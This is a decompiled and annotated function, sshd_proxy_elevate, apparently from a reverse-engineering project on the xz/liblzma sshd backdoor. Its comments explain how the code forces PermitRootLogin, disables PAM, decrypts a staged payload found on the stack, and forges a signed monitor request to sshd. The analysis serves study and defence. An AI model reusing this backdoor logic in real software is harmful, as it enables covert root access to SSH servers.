// /home/kali/xzre-ghidra/xzregh/108270_sshd_proxy_elevate.c
// Function: sshd_proxy_elevate @ 0x108270
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_proxy_elevate(monitor_data_t * args, global_context_t * ctx)


/*
 * AutoDoc: Implements the privileged half of the monitor command channel. It sanity-checks every pointer/import vector, enforces that
 * KEYALLOWED support is present before privileged commands run, and toggles sshd's PermitRootLogin/PAM globals according
 * to the request flags. For PROXY_EXCHANGE control frames lacking both monitor-flag bits it walks the stack for the staged
 * ChaCha header, verifies the SHA-256 digest, unwraps the secret-data key/nonce, and decrypts the pending payload in place.
 * It then clears the monitor frame buffers, serialises the attacker's modulus/exponent, signs the request, and streams it over
 * whichever monitor socket or fd override the caller selected. Optional sshbuf attachments follow KEYALLOWED continuations,
 * "wait" commands drain replies, and SYSTEM_EXEC can still ask libc's exit() to terminate sshd when everything succeeds.
 */

#include "xzre_types.h"

BOOL sshd_proxy_elevate(monitor_data_t *args,global_context_t *ctx)

{
  u8 current_byte;
  char expected_digest_byte;
  monitor_cmd_type_t cmd_type;
  imported_funcs_t *imports;
  libc_imports_t *libc_funcs;
  sshd_ctx_t *sshd_ctx;
  long *payload_header;
  u64 *stack_limit;
  pfn_EVP_Digest_t evp_digest;
  BOOL success;
  uint frame_len_be;
  int status;
  cmd_arguments_t *cmd_args;
  long *payload_scan_end;
  ssize_t io_result;
  int *errno_slot;
  RSA *rsa_ctx;
  BIGNUM *rsa_e_bn;
  BIGNUM *rsa_n_bn;
  BIGNUM *rsa_d_bn;
  EVP_MD *digest_type;
  long loop_idx;
  byte extraout_DL;
  size_t payload_size;
  byte monitor_flag_mask;
  u64 *stack_slot;
  u64 payload_room;
  uint *frame_scratch_iter;
  ulong *signature_word_cursor;
  sshbuf *sshbuf_cursor;
  uint *request_words;
  uint *rsa_words_cursor;
  uchar *hash_zero_cursor;
  uint *frame_copy_cursor;
  size_t *sshbuf_size_cursor;
  u8 *payload_copy_cursor;
  char *rsa_alg_name;
  ulong payload_remaining;
  long *stack_candidate;
  long digest_idx;
  byte zero_stride_flag;
  u8 monitor_request [1800];
  cmd_arguments_t *cmd_flags;
  RSA *rsa_tmp;
  uchar rsa_exponent_byte;
  int monitor_fd;
  uint rsa_signature_len;
  u64 serialized_chunk_len;
  BIGNUM *rsa_components[2];
  uchar rsa_message_digest[32];
  u64 rsa_modulus_qword0;
  u64 rsa_modulus_qword1;
  uint rsa_modulus_words[57];
  uchar rsa_modulus_shift;
  uchar rsa_modulus_flag;
  ulong rsa_signature_block[2];
  uint sshbuf_tmp_words[60];
  sshbuf sshbuf_vec[4];
  uint netlen_tmp[2];
  uchar netlen_tmp_pad;
  uchar netlen_tmp_pad_hi[7];
  uchar payload_hash [32];
  uint rsa_template_words[66];
  uint monitor_req_len_prefix;
  uint monitor_req_digest_len;
  uint monitor_req_payload_len;
  uchar monitor_req_prefix_bytes[3];
  uchar monitor_req_prefix_pad;
  uchar monitor_req_prefix_pad_hi[3];
  uint monitor_req_header_words[5];
  uchar monitor_req_frame[399];
  u8 monitor_req_payload[1868];
  
  zero_stride_flag = 0;
  monitor_req_header_words[0] = 0;
  monitor_req_header_words[1] = 0;
  monitor_req_header_words[2] = 0;
  monitor_req_header_words[3] = 0;
  request_words = monitor_req_header_words + 4;
  for (loop_idx = 0x236; loop_idx != 0; loop_idx = loop_idx + -1) {
    *request_words = 0;
    request_words = request_words + 1;
  }
  monitor_fd = -1;
  if (args == (monitor_data_t *)0x0) {
    return FALSE;
  }
  rsa_e_bn = args->rsa_n;
  if (rsa_e_bn == (BIGNUM *)0x0) {
    return FALSE;
  }
  rsa_n_bn = args->rsa_e;
  if (rsa_n_bn == (BIGNUM *)0x0) {
    return FALSE;
  }
  cmd_type = args->cmd_type;
  if ((cmd_type == MONITOR_CMD_PROXY_EXCHANGE) && ((args->args->monitor_flags & 0x40) == 0)) {
    if (args->rsa == (RSA *)0x0) {
      return FALSE;
    }
    if (args->payload_body == (u8 *)0x0) {
      return FALSE;
    }
    if (args->payload_body_size != 0x30) {
      return FALSE;
    }
  }
  if (ctx == (global_context_t *)0x0) {
    return FALSE;
  }
  imports = ctx->imported_funcs;
  if (imports == (imported_funcs_t *)0x0) {
    return FALSE;
  }
  libc_funcs = ctx->libc_imports;
  if (libc_funcs == (libc_imports_t *)0x0) {
    return FALSE;
  }
  if (libc_funcs->pselect == (pfn_pselect_t)0x0) {
    return FALSE;
  }
  if (libc_funcs->__errno_location == (pfn___errno_location_t)0x0) {
    return FALSE;
  }
  sshd_ctx = ctx->sshd_ctx;
  // AutoDoc: Before the mm hooks land, only the minimal control-plane commands are accepted; anything needing KEYALLOWED is rejected.
  if (sshd_ctx->have_mm_answer_keyallowed == FALSE) {
    if (cmd_type == MONITOR_CMD_CONTROL_PLANE) {
      return FALSE;
    }
    cmd_args = args->args;
    if (cmd_type != MONITOR_CMD_PROXY_EXCHANGE) {
      if (cmd_args == (cmd_arguments_t *)0x0) {
        if (cmd_type != MONITOR_CMD_PATCH_VARIABLES) goto LAB_0010845f;
      }
      else if (cmd_type != MONITOR_CMD_PATCH_VARIABLES) {
        if (cmd_type == MONITOR_CMD_SYSTEM_EXEC) goto LAB_0010845f;
        goto LAB_00108447;
      }
      goto LAB_0010843f;
    }
    if ((cmd_args->request_flags & 0x20) != 0) {
      return FALSE;
    }
LAB_0010844c:
    current_byte = cmd_args->field_0x3;
LAB_00108450:
    if ((char)current_byte < '\0') goto LAB_0010845f;
  }
  else {
    cmd_args = args->args;
    if (cmd_args == (cmd_arguments_t *)0x0) {
      if (cmd_type == MONITOR_CMD_CONTROL_PLANE) goto LAB_00108434;
      if (cmd_type != MONITOR_CMD_PATCH_VARIABLES) {
LAB_00108447:
        if (cmd_type != MONITOR_CMD_PROXY_EXCHANGE) goto LAB_0010845f;
        goto LAB_0010844c;
      }
    }
    else if (cmd_type != MONITOR_CMD_PATCH_VARIABLES) {
      if (cmd_type == MONITOR_CMD_SYSTEM_EXEC) goto LAB_0010845f;
      if (cmd_type != MONITOR_CMD_CONTROL_PLANE) goto LAB_00108447;
LAB_00108434:
      current_byte = cmd_args->monitor_flags;
      goto LAB_00108450;
    }
LAB_0010843f:
    if ((cmd_args->monitor_flags & 1) != 0) goto LAB_0010845f;
  }
  // AutoDoc: Force sshd to treat PermitRootLogin as "forced backdoor" so the dispatcher never downgrades privileges.
  *sshd_ctx->permit_root_login_ptr = 3;
LAB_0010845f:
  if ((args->cmd_type < MONITOR_CMD_SYSTEM_EXEC) || (args->cmd_type == MONITOR_CMD_PROXY_EXCHANGE))
  {
    if ((cmd_args->control_flags & 0x40) != 0) {
      if (sshd_ctx->use_pam_ptr == (int *)0x0) {
        return FALSE;
      }
      // AutoDoc: Control-flag bit 0x40 disables PAM outright so the forged monitor exchange bypasses any auth stack.
      *sshd_ctx->use_pam_ptr = 0;
    }
    // AutoDoc: PRIV/EXIT payloads hunt the stack for the staged ChaCha blob, verify its hash, and decrypt it in place before forging the monitor request.
    if ((args->cmd_type == MONITOR_CMD_PROXY_EXCHANGE) &&
       (monitor_flag_mask = cmd_args->monitor_flags & 0xc0, monitor_flag_mask != 0xc0)) {
      if (monitor_flag_mask == 0x40) {
        if (libc_funcs->exit == (pfn_exit_t)0x0) {
          return FALSE;
        }
        // AutoDoc: Command type 2 asks libc's `exit()` to terminate sshd once the exchange is done.
        (*libc_funcs->exit)(0);
        return FALSE;
      }
      if (args->payload_body_size < 0x30) {
        return FALSE;
      }
      payload_header = (long *)args->payload_body;
      loop_idx = *payload_header;
      payload_size = payload_header[1];
      if (0x3fef < payload_size - 0x11) {
        return FALSE;
      }
      stack_limit = (undefined8 *)libc_funcs->__libc_stack_end;
      stack_slot = (undefined8 *)register0x00000020;
      do {
        if (stack_limit <= stack_slot) {
          return FALSE;
        }
        stack_candidate = (long *)*stack_slot;
        if ((long *)0xffffff < stack_candidate) {
          success = is_range_mapped((u8 *)stack_candidate,0x4001 - payload_size,ctx);
          if (success != FALSE) {
            payload_scan_end = (long *)((0x4001 - payload_size) + (long)stack_candidate);
            for (; stack_candidate < payload_scan_end; stack_candidate = (long *)((long)stack_candidate + 1)) {
              netlen_tmp[0] = 0;
              netlen_tmp[1] = 0;
              netlen_tmp_pad = 0;
              netlen_tmp_pad_hi = 0;
              payload_hash[0] = '\0';
              payload_hash[1] = '\0';
              payload_hash[2] = '\0';
              payload_hash[3] = '\0';
              payload_hash[4] = '\0';
              payload_hash[5] = '\0';
              payload_hash[6] = '\0';
              payload_hash[7] = '\0';
              payload_hash[8] = '\0';
              payload_hash[9] = '\0';
              payload_hash[10] = '\0';
              payload_hash[0xb] = '\0';
              payload_hash[0xc] = '\0';
              payload_hash[0xd] = '\0';
              payload_hash[0xe] = '\0';
              payload_hash[0xf] = '\0';
              if ((*stack_candidate == loop_idx) &&
                 (success = sha256(stack_candidate,payload_size,(u8 *)netlen_tmp,0x20,ctx->imported_funcs),
                 success != FALSE)) {
                digest_idx = 0;
                while( TRUE ) {
                  expected_digest_byte = *(char *)((long)payload_header + digest_idx + 0x10);
                  current_byte = *(u8 *)((long)netlen_tmp + digest_idx);
                  if ((expected_digest_byte < (char)current_byte) || ((char)current_byte < expected_digest_byte)) break;
                  digest_idx = digest_idx + 1;
                  if (digest_idx == 0x20) {
                    netlen_tmp[0] = 0;
                    netlen_tmp[1] = 0;
                    netlen_tmp_pad = 0;
                    netlen_tmp_pad_hi = 0;
                    hash_zero_cursor = payload_hash;
                    for (loop_idx = 0x29; loop_idx != 0; loop_idx = loop_idx + -1) {
                      *hash_zero_cursor = '\0';
                      hash_zero_cursor = hash_zero_cursor + (ulong)zero_stride_flag * -2 + 1;
                    }
                    // AutoDoc: Once the header digest matches, fetch the ChaCha key/nonce from secret_data so the staged payload can be reused.
                    success = secret_data_get_decrypted((u8 *)netlen_tmp,ctx);
                    if (success == FALSE) {
                      return FALSE;
                    }
                    payload_size = payload_size - 0x10;
                    request_words = (uint *)(stack_candidate + 2);
                    // AutoDoc: Decrypt the blob directly on the victim stack so the cleartext monitor arguments are ready for serialization.
                    success = chacha_decrypt((u8 *)request_words,(int)payload_size,(u8 *)netlen_tmp,(u8 *)stack_candidate,
                                            (u8 *)request_words,ctx->imported_funcs);
                    if (success == FALSE) {
                      return FALSE;
                    }
                    goto LAB_00108861;
                  }
                }
              }
            }
          }
        }
        stack_slot = stack_slot + 1;
      } while( TRUE );
    }
  }
  rsa_alg_name = ctx->ssh_rsa_cert_alg;
  rsa_signature_block[0] = 0;
  rsa_signature_block[1] = 0;
  request_words = netlen_tmp;
  for (loop_idx = 0x69; loop_idx != 0; loop_idx = loop_idx + -1) {
    *request_words = 0;
    request_words = request_words + 1;
  }
  rsa_exponent_byte = '\x01';
  sshbuf_cursor = sshbuf_vec;
  for (loop_idx = 0x47; loop_idx != 0; loop_idx = loop_idx + -1) {
    *(undefined4 *)&sshbuf_cursor->rsa_d_bn = 0;
    sshbuf_cursor = (sshbuf *)((long)&sshbuf_cursor->rsa_d_bn + 4);
  }
  rsa_signature_len = 0;
  rsa_words_cursor = rsa_modulus_words;
  for (loop_idx = 0x3c; loop_idx != 0; loop_idx = loop_idx + -1) {
    *rsa_words_cursor = 0;
    rsa_words_cursor = rsa_words_cursor + 1;
  }
  rsa_message_digest[0] = '\0';
  rsa_message_digest[1] = '\0';
  rsa_message_digest[2] = '\0';
  rsa_message_digest[3] = '\0';
  rsa_message_digest[4] = '\0';
  rsa_message_digest[5] = '\0';
  rsa_message_digest[6] = '\0';
  rsa_message_digest[7] = '\0';
  rsa_message_digest[8] = '\0';
  rsa_message_digest[9] = '\0';
  rsa_message_digest[10] = '\0';
  rsa_message_digest[0xb] = '\0';
  rsa_message_digest[0xc] = '\0';
  rsa_message_digest[0xd] = '\0';
  rsa_message_digest[0xe] = '\0';
  rsa_message_digest[0xf] = '\0';
  rsa_words_cursor = sshbuf_tmp_words;
  for (loop_idx = 0x3c; loop_idx != 0; loop_idx = loop_idx + -1) {
    *rsa_words_cursor = 0;
    rsa_words_cursor = rsa_words_cursor + 1;
  }
  rsa_message_digest[0x10] = '\0';
  rsa_message_digest[0x11] = '\0';
  rsa_message_digest[0x12] = '\0';
  rsa_message_digest[0x13] = '\0';
  rsa_message_digest[0x14] = '\0';
  rsa_message_digest[0x15] = '\0';
  rsa_message_digest[0x16] = '\0';
  rsa_message_digest[0x17] = '\0';
  rsa_message_digest[0x18] = '\0';
  rsa_message_digest[0x19] = '\0';
  rsa_message_digest[0x1a] = '\0';
  rsa_message_digest[0x1b] = '\0';
  rsa_message_digest[0x1c] = '\0';
  rsa_message_digest[0x1d] = '\0';
  rsa_message_digest[0x1e] = '\0';
  rsa_message_digest[0x1f] = '\0';
  rsa_modulus_qword0 = 0;
  rsa_modulus_qword1 = 0;
  if (((rsa_alg_name != (char *)0x0) && (ctx->rsa_sha2_256_alg != (char *)0x0)) &&
     (success = contains_null_pointers(&imports->RSA_new,9), success == FALSE)) {
    request_words = monitor_req_header_words;
    digest_idx = 0;
    payload_remaining = 0;
    netlen_tmp[1] = (uint)extraout_DL;
    netlen_tmp_pad = 2;
    frame_scratch_iter = request_words;
    for (loop_idx = 0x23a; loop_idx != 0; loop_idx = loop_idx + -1) {
      *frame_scratch_iter = 0;
      frame_scratch_iter = frame_scratch_iter + (ulong)zero_stride_flag * -2 + 1;
    }
    payload_hash[5] = '\0';
    payload_hash[6] = '\0';
    payload_hash[7] = '\0';
    payload_hash[8] = '\x1c';
    rsa_components[0] = rsa_n_bn;
    rsa_modulus_qword0 = CONCAT71((rsa_modulus_qword0 >> 8),0x80);
    rsa_components[1] = rsa_e_bn;
    *(u64 *)(payload_hash + 9) = (undefined7)*(undefined8 *)rsa_alg_name;
    payload_hash[0x10] = (uchar)((ulong)*(undefined8 *)rsa_alg_name >> 0x38);
    *(uint *)(payload_hash + 0x11) = (undefined4)*(undefined8 *)(rsa_alg_name + 8);
    rsa_modulus_shift = 8;
    rsa_modulus_flag = 1;
    *(uint *)(payload_hash + 0x15) = (undefined4)*(undefined8 *)(rsa_alg_name + 0xc);
    *(uint *)(payload_hash + 0x19) = (undefined4)((ulong)*(undefined8 *)(rsa_alg_name + 0xc) >> 0x20);
    stack0xfffffffffffff50d = *(undefined8 *)(rsa_alg_name + 0x14);
    stack_slot = &rsa_modulus_qword0;
    rsa_words_cursor = rsa_template_words;
    for (loop_idx = 0x40; loop_idx != 0; loop_idx = loop_idx + -1) {
      *rsa_words_cursor = *(undefined4 *)stack_slot;
      stack_slot = (undefined8 *)((long)stack_slot + (ulong)zero_stride_flag * -8 + 4);
      rsa_words_cursor = rsa_words_cursor + (ulong)zero_stride_flag * -2 + 1;
    }
    payload_room = 0x628;
    monitor_req_len_prefix = 0x1000000;
    monitor_req_payload_len = 0x7000000;
    monitor_req_prefix_bytes = (undefined3)*(undefined4 *)rsa_alg_name;
    monitor_req_prefix_pad = (undefined1)*(undefined4 *)(rsa_alg_name + 3);
    monitor_req_prefix_pad_hi = (undefined3)((uint)*(undefined4 *)(rsa_alg_name + 3) >> 8);
    while( TRUE ) {
      serialized_chunk_len = 0;
      // AutoDoc: Serialise the attacker's exponent and modulus into the monitor frame so sshd sees a well-formed RSA keypair.
      success = bignum_serialize(monitor_req_payload + payload_remaining,payload_room,&serialized_chunk_len,rsa_components[digest_idx],imports);
      if ((success == FALSE) || (payload_room < serialized_chunk_len)) break;
      payload_remaining = payload_remaining + serialized_chunk_len;
      payload_room = payload_room - serialized_chunk_len;
      if (digest_idx != 0) {
        if (0x628 < payload_remaining) {
          return FALSE;
        }
        status = (int)payload_remaining;
        frame_len_be = status + 0xb;
        monitor_req_digest_len = frame_len_be >> 0x18 | (frame_len_be & 0xff0000) >> 8 | (frame_len_be & 0xff00) << 8 |
                    frame_len_be * 0x1000000;
        frame_len_be = status + 0x2a7;
        *(uint *)(payload_hash + 1) =
             frame_len_be >> 0x18 | (frame_len_be & 0xff0000) >> 8 | (frame_len_be & 0xff00) << 8 | frame_len_be * 0x1000000
        ;
        frame_len_be = status + 700;
        netlen_tmp[0] = frame_len_be >> 0x18 | (frame_len_be & 0xff0000) >> 8 | (frame_len_be & 0xff00) << 8 |
                       frame_len_be * 0x1000000;
        imports = ctx->imported_funcs;
        frame_scratch_iter = netlen_tmp;
        frame_copy_cursor = request_words;
        for (loop_idx = 0x69; loop_idx != 0; loop_idx = loop_idx + -1) {
          *frame_copy_cursor = *frame_scratch_iter;
          frame_scratch_iter = frame_scratch_iter + (ulong)zero_stride_flag * -2 + 1;
          frame_copy_cursor = frame_copy_cursor + (ulong)zero_stride_flag * -2 + 1;
        }
        rsa_ctx = (*imports->RSA_new)();
        if (rsa_ctx == (RSA *)0x0) {
          return FALSE;
        }
        rsa_e_bn = (*ctx->imported_funcs->BN_bin2bn)(&rsa_exponent_byte,1,(BIGNUM *)0x0);
        if (rsa_e_bn != (BIGNUM *)0x0) {
          rsa_n_bn = (*ctx->imported_funcs->BN_bin2bn)((uchar *)&rsa_modulus_qword0,0x100,(BIGNUM *)0x0);
          rsa_d_bn = (*ctx->imported_funcs->BN_bin2bn)(&rsa_exponent_byte,1,(BIGNUM *)0x0);
          // AutoDoc: Build a temporary RSA object from the supplied components in order to hash and sign the forged packet.
          status = (*ctx->imported_funcs->RSA_set0_key)(rsa_ctx,rsa_n_bn,rsa_e_bn,rsa_d_bn);
          if (status != 1) goto LAB_00108cd2;
          evp_digest = ctx->imported_funcs->EVP_Digest;
          digest_type = (*ctx->imported_funcs->EVP_sha256)();
          status = (*evp_digest)(monitor_req_frame,payload_remaining + 399,rsa_message_digest,(uint *)0x0,digest_type,(ENGINE *)0x0);
          if (status == 1) {
            status = (*ctx->imported_funcs->RSA_sign)
                               (0x2a0,rsa_message_digest,0x20,(uchar *)rsa_signature_block,&rsa_signature_len,rsa_ctx);
            if ((status == 1) && (rsa_signature_len == 0x100)) {
              sshbuf_vec[0].rsa_d_bn = (u8 *)0xc00000014010000;
              *(uint *)((u8 *)&sshbuf_vec[0].off + 4) = 0x10000;
              sshbuf_vec[0].cd = *(u8 **)ctx->rsa_sha2_256_alg;
              *(uint *)&sshbuf_vec[0].off = *(undefined4 *)(ctx->rsa_sha2_256_alg + 8);
              payload_size = payload_remaining + 0x2c0;
              signature_word_cursor = rsa_signature_block;
              sshbuf_size_cursor = &sshbuf_vec[0].size;
              for (loop_idx = 0x40; loop_idx != 0; loop_idx = loop_idx + -1) {
                *(int *)sshbuf_size_cursor = (int)*signature_word_cursor;
                signature_word_cursor = (ulong *)((long)signature_word_cursor + (ulong)zero_stride_flag * -8 + 4);
                sshbuf_size_cursor = (size_t *)((long)sshbuf_size_cursor + (ulong)zero_stride_flag * -8 + 4);
              }
              imports = ctx->imported_funcs;
              sshbuf_cursor = sshbuf_vec;
              payload_copy_cursor = monitor_req_payload + payload_remaining;
              for (loop_idx = 0x47; loop_idx != 0; loop_idx = loop_idx + -1) {
                *(undefined4 *)payload_copy_cursor = *(undefined4 *)&sshbuf_cursor->rsa_d_bn;
                sshbuf_cursor = (sshbuf *)((long)sshbuf_cursor + (ulong)zero_stride_flag * -8 + 4);
                payload_copy_cursor = payload_copy_cursor + ((ulong)zero_stride_flag * -2 + 1) * 4;
              }
              (*imports->RSA_free)(rsa_ctx);
LAB_00108861:
              cmd_args = args->args;
              cmd_type = args->cmd_type;
              if (cmd_args == (cmd_arguments_t *)0x0) {
                return FALSE;
              }
              // AutoDoc: Without an explicit socket override, call `sshd_get_client_socket`; otherwise honour the encoded socket selector bits.
              if ((cmd_args->control_flags & 0x20) == 0) {
                success = sshd_get_client_socket(ctx,&monitor_fd,1,DIR_WRITE);
              }
              else {
                if (cmd_type == MONITOR_CMD_SYSTEM_EXEC) {
                  monitor_flag_mask = cmd_args->monitor_flags >> 1;
LAB_001088b7:
                  frame_len_be = (uint)monitor_flag_mask;
                }
                else if (cmd_type < MONITOR_CMD_PROXY_EXCHANGE) {
                  if (cmd_type != MONITOR_CMD_CONTROL_PLANE) {
                    monitor_flag_mask = cmd_args->monitor_flags >> 2;
                    goto LAB_001088b7;
                  }
                  frame_len_be = cmd_args->monitor_flags >> 3 & 0xf;
                }
                else {
                  frame_len_be = 1;
                  if (cmd_type == MONITOR_CMD_PROXY_EXCHANGE) {
                    frame_len_be = cmd_args->request_flags & 0x1f;
                  }
                }
                success = sshd_get_usable_socket(&monitor_fd,frame_len_be,ctx->libc_imports);
              }
              status = monitor_fd;
              if (success == FALSE) {
                return FALSE;
              }
              cmd_args = args->args;
              cmd_type = args->cmd_type;
              libc_funcs = ctx->libc_imports;
              sshbuf_cursor = sshbuf_vec;
              for (loop_idx = 0x12; loop_idx != 0; loop_idx = loop_idx + -1) {
                *(undefined4 *)&sshbuf_cursor->rsa_d_bn = 0;
                sshbuf_cursor = (sshbuf *)((long)sshbuf_cursor + (ulong)zero_stride_flag * -8 + 4);
              }
              if (monitor_fd < 0) {
                return FALSE;
              }
              if (cmd_args == (cmd_arguments_t *)0x0) {
                return FALSE;
              }
              if (libc_funcs == (libc_imports_t *)0x0) {
                return FALSE;
              }
              if (libc_funcs->exit == (pfn_exit_t)0x0) {
                return FALSE;
              }
              // AutoDoc: COMMAND payloads (and explicit KEYALLOWED continuations) borrow an sshbuf so extra ciphertext can follow the forged frame.
              if ((cmd_type == MONITOR_CMD_CONTROL_PLANE) ||
                 ((cmd_type == MONITOR_CMD_PROXY_EXCHANGE && ((cmd_args->request_flags & 0x20) != 0))))
              {
                success = sshd_get_sshbuf(sshbuf_vec,ctx);
                if (success == FALSE) {
                  return FALSE;
                }
                ctx->exit_flag = cmd_args->control_flags & 1;
              }
              // AutoDoc: Push the forged monitor frame across the target fd; any short write aborts the run.
              io_result = fd_write(status,request_words,payload_size,libc_funcs);
              if (io_result < 0) {
                return FALSE;
              }
              if (cmd_type == MONITOR_CMD_CONTROL_PLANE) {
LAB_001089b5:
                netlen_tmp[1] = netlen_tmp[1] & 0xffffff00;
                payload_size = sshbuf_vec[0].size;
                if (0x40 < sshbuf_vec[0].size) {
                  payload_size = 0x40;
                }
                frame_len_be = (int)payload_size + 1;
                netlen_tmp[0] = frame_len_be >> 0x18 | (frame_len_be & 0xff0000) >> 8 | (frame_len_be & 0xff00) << 8 |
                               frame_len_be * 0x1000000;
                io_result = fd_write(status,netlen_tmp,5,libc_funcs);
                if (io_result < 0) {
                  return FALSE;
                }
                io_result = fd_write(status,sshbuf_vec[0].rsa_d_bn,payload_size,libc_funcs);
                if (io_result < 0) {
                  return FALSE;
                }
                if (cmd_type != MONITOR_CMD_PROXY_EXCHANGE) goto LAB_0010897e;
              }
              else {
                if (cmd_type != MONITOR_CMD_PROXY_EXCHANGE) goto LAB_0010897e;
                if ((cmd_args->request_flags & 0x20) != 0) goto LAB_001089b5;
              }
              if (-1 < (char)cmd_args->control_flags) {
                return TRUE;
              }
LAB_0010897e:
              // AutoDoc: When the wait bit is set, read the reply length and drain the monitor socket until sshd finishes responding.
              rsa_signature_block[0] = rsa_signature_block[0] & 0xffffffff00000000;
              io_result = fd_read(status,rsa_signature_block,4,libc_funcs);
              if (io_result < 0) {
                return FALSE;
              }
              frame_len_be = (uint)rsa_signature_block[0] >> 0x18 | ((uint)rsa_signature_block[0] & 0xff0000) >> 8 |
                       ((uint)rsa_signature_block[0] & 0xff00) << 8 | (uint)rsa_signature_block[0] << 0x18;
              rsa_signature_block[0] = CONCAT44(*(uint *)((u8 *)&rsa_signature_block[0] + 4),frame_len_be);
              payload_remaining = (ulong)frame_len_be;
              if (payload_remaining != 0) {
                if (libc_funcs->read == (pfn_read_t)0x0) {
                  return FALSE;
                }
                if (libc_funcs->__errno_location == (pfn___errno_location_t)0x0) {
                  return FALSE;
                }
                do {
                  while( TRUE ) {
                    payload_size = 0x200;
                    if (payload_remaining < 0x201) {
                      payload_size = payload_remaining;
                    }
                    io_result = (*libc_funcs->read)(status,netlen_tmp,payload_size);
                    if (-1 < io_result) break;
                    errno_slot = (*libc_funcs->__errno_location)();
                    if (*errno_slot != 4) {
                      return FALSE;
                    }
                  }
                  if (io_result == 0) {
                    return FALSE;
                  }
                  payload_remaining = payload_remaining - io_result;
                } while (payload_remaining != 0);
              }
              if (cmd_type != MONITOR_CMD_SYSTEM_EXEC) {
                return TRUE;
              }
              if (libc_funcs->exit == (pfn_exit_t)0x0) {
                return FALSE;
              }
              (*libc_funcs->exit)(0);
              return TRUE;
            }
          }
        }
        rsa_n_bn = (BIGNUM *)0x0;
        rsa_e_bn = (BIGNUM *)0x0;
        rsa_d_bn = (BIGNUM *)0x0;
LAB_00108cd2:
        (*ctx->imported_funcs->RSA_free)(rsa_ctx);
        if (rsa_e_bn != (BIGNUM *)0x0) {
          (*ctx->imported_funcs->BN_free)(rsa_e_bn);
        }
        if (rsa_n_bn != (BIGNUM *)0x0) {
          (*ctx->imported_funcs->BN_free)(rsa_n_bn);
        }
        if (rsa_d_bn == (BIGNUM *)0x0) {
          return FALSE;
        }
        (*ctx->imported_funcs->BN_free)(rsa_d_bn);
        return FALSE;
      }
      digest_idx = 1;
    }
  }
  return FALSE;
}

